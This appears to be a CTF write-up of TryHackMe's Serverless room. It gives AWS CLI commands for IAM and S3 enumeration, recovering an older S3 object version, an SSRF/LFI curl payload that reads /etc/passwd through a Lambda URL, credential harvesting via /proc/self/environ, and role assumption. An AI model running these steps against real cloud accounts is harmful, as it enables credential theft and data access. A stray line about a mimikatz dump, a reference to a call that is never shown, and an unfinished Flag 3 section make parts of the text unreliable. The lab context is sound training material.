---
title: TryHackMe Serverless Hackfinity Battle Write-Up Walk Through
date: 2025-03-25 07:00:00 +0200
categories: [TryHackMe, CTF,Hackfinity Battle, TryHackMe Write Up]
tags: [Serverless, AWS, CloudHacking, SSRF, LFI, AWSCLI, Hackfinity, ctf]
description: "Looks like we got some AWS credentials for the DarkMatter gang. Well, at least for one of its contractors, a guy called ShadowFang. It seems they are hosting all their red team infrastructure in the cloud. Let’s try to get access to the information they stole from people and take it back!"
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-serverless.png
  alt: TryHackMe Dump Hackfinity Battle
---

# Introduction

Armed with the ShadowFang credentials, I navigated S3 buckets, exploited Lambda functions, and escalated privileges to uncover three flags hidden in the DarkMatter gang’s infrastructure. Here’s how I cracked it, step by step.

**[You can follow YouTube video walk through here](https://youtu.be/tgQVXn95UiE)**

## Flag 1: S3 Versioning
The journey began with enumerating AWS resources using ShadowFang’s creds. Listing buckets revealed `redteamapp-bucket`:

 been given full mimikatz LSASS dump, below part of it:

```console
aws configure
aws sts get-caller-identity

aws s3 ls

aws iam list-attached-user-policies --user-name sh4d0wF4NG
aws iam list-user-policies --user-name sh4d0wF4NG
aws iam list-groups-for-user --user-name sh4d0wF4NG
aws iam list-group-policies --group-name  redteamapp
aws iam list-attached-group-policies --group-name redteamapp
aws iam get-policy --policy-arn arn:aws:iam::471112876654:policy/redteamapp-policy
aws iam get-policy-version --policy-arn arn:aws:iam::471112876654:policy/redteamapp-policy --version-id v14
```
Downloading `admin/index.html` hinted at a flag that “used to be there.” Digging into versioning with:

```console
aws s3api list-object-versions --bucket redteamapp-bucket --prefix admin/
```
I spotted an older version (ID: `UERAkdEpjINhaB8GcvBmZY5hM8d.wNu5`). Retrieving it:

```console
aws s3api get-object --bucket redteamapp-bucket --key admin/index.html --version-id UERAkdEpjINhaB8GcvBmZY5hM8d.wNu5 flag1.html
```
yielded THM{SSE_*******}—Flag 1 secured.

**[You can follow YouTube video walk through here](https://youtu.be/tgQVXn95UiE)**

## Flag 2: Lambda Local File Inclusion

The old `index.html` mentioned a “Web Site Fetcher” Lambda, pointing to `https://wtygxa6iigudd534pityks7ymu0wzqpg.lambda-url.us-east-1.on.aws/`. Testing Local File Inclusion (LFI):



```console
curl -X POST -H "Content-Type: application/json" -d '{"url": "file:///etc/passwd"}' https://wtygxa6iigudd534pityks7ymu0wzqpg.lambda-url.us-east-1.on.aws/

```
delivered Flag 2—another win.

**[You can follow YouTube video walk through here](https://youtu.be/tgQVXn95UiE)**

## Flag 3: DynamoDB via Role Escalation

The same `/proc/self/environ` call gave Lambda role creds (`redteamapp-lambda-role-szx0n1l0`), but `aws dynamodb list-tables failed—limited perms`. The old index.html hinted at “Leak DB Administration,” suggesting a database. Assuming the `redteamapp-dev-role`:

```console
aws sts assume-role --role-arn arn:aws:iam::471112876654:role/redteamapp-dev-role --role-session-name dev-role
```
with Lambda creds, I got new credentials. Setting them:

```console
export AWS_ACCESS_KEY_ID=[DevKey]
export AWS_SECRET_ACCESS_KEY=[DevSecret]
export AWS_SESSION_TOKEN=[DevToken]
```

# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/tgQVXn95UiE)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/tgQVXn95UiE)**

<img src="tryhackme-serverless-youtube.png"  alt="TryHackMe Serverless YouTube Video Walk through" >


